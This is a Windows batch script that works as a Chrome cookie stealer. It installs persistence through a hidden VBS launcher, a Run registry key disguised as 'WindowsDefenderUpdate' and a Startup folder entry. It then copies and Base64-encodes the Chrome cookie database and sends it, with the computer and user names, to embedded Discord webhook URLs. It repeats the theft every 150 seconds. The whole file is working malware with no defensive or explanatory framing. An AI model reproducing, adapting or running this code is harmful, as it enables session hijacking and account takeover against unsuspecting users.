@echo off
set "LOGS=https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"
set "REGRAB=https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"
set "ONLINE=https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0Xr0EenAjLTUdEpn-GY0CMauHvjr877IA6JXsbd9kYpbUTGPkYMDJVda"

set "PC=%COMPUTERNAME%"
set "USER=%USERNAME%"
set "CHROME_COOKIES=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies"
set "TEMP_COOKIES=%TEMP%\ck.tmp"

:: --- PERSISTENCE ---
echo Set WShell = CreateObject("WScript.Shell") > "%TEMP%\vanta_launch.vbs"
echo WShell.Run """%~dp0%~nx0""", 0, False >> "%TEMP%\vanta_launch.vbs"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderUpdate /t REG_SZ /d "wscript.exe //B \"%TEMP%\vanta_launch.vbs\"" /f >nul
copy /Y "%TEMP%\vanta_launch.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs" >nul
:: ------------------

echo Checking for Chrome...
set "cookie_data=No Chrome cookies found. User might not have Chrome installed or logged in."

if exist "%CHROME_COOKIES%" (
    echo Chrome found. Copying cookies...
    copy /Y "%CHROME_COOKIES%" "%TEMP_COOKIES%" >nul
    
    :: Encode the raw SQLite file to Base64 so it can be sent in a Discord text embed
    for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('%TEMP_COOKIES%'))"`) do set "cookie_data=%%a"
    
    del "%TEMP_COOKIES%"
)

echo Sending initial logs...
curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Initial Log\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %LOGS%
curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Chrome Cookie DB (Base64)\",\"description\":\"```\n%cookie_data%\n```\",\"color\":65280}]}" %LOGS%
curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"User Online\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %ONLINE%

echo Script is now looping.
:loop
timeout /t 150 /nobreak >nul
if exist "%CHROME_COOKIES%" (
    copy /Y "%CHROME_COOKIES%" "%TEMP_COOKIES%" >nul
    for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('%TEMP_COOKIES%'))"`) do set "cookie_data=%%a"
    curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Regrab Chrome DB\",\"description\":\"Client: %PC% / %USER%\n```\n%cookie_data%\n```\",\"color\":65280}]}" %REGRAB%
    del "%TEMP_COOKIES%"
)
goto loop
